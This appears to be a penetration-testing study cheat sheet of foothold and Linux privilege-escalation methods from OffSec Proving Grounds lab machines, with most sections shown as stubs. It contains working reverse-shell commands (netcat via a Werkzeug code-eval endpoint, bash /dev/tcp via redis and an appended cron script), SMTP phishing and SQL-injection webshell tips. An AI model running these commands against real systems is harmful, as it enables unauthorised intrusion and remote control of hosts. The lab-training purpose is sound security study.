# Proving Grounds Methods

| [[#Initial Foothold]] | [[#Linux Privilege Escalation]] |
| --------------------- | ------------------------------- |

## Initial Foothold

### Vulnerability Research on EDB
...
### Python Code Evaluation (Werkzeug)
...
http://192.168.142.117:5000/verify -X POST --data 'code=os.system("nc 192.168.1.154 18000 -e /bin/bash")'
```

### SSH with Found Private Keys
...
telnet> reset password at this link <http://192.168.1.147/>
telnet> .
...
### SQL Injection to Upload Webshell
...
redis> system.exec "bash -i >& /dev/tcp/192.168.1.155/6379 0>&1"
```
...
### Abuse Existing Sudo Privileges
...
### Chain Privileges Across Different Users
...
### CVE Exploitation - Add User to Sudoers
...
### Git Repository Manipulation with Cron Jobs
...
[dademola@hunit ~]$ echo "bash -c 'bash -i >& /dev/tcp/192.168.1.167/18030 0>&1'" >> backups.sh
...
kali@kali:~/git-server$ echo "bash -c 'bash -i >& /dev/tcp/192.168.1.167/18030 0>&1'" >> backups.sh
...
1. **Initial Enumeration is Critical** - Version numbers in HTML comments, HTTP headers
2. **Try Multiple Users with Found Keys** - Don't stop at the first failure
3. **Creative Social Engineering** - SMTP phishing can yield credentials
4. **SQL Injection → File Upload** - `INTO OUTFILE` for webshell placement
5. **Chain User Privileges** - Different users may have different sudo capabilities
6. **Library Hijacking** - LD_LIBRARY_PATH exploitation with cron jobs
7. **Git Repositories** - Can be leveraged for privilege escalation if root pulls changes

---

## References

All techniques sourced from OffSec Proving Grounds Practice machines:
- ZenPhoto, hetemit, Clue, Postfish, Hawat, Sybaris, Nukem, pc, Hunit
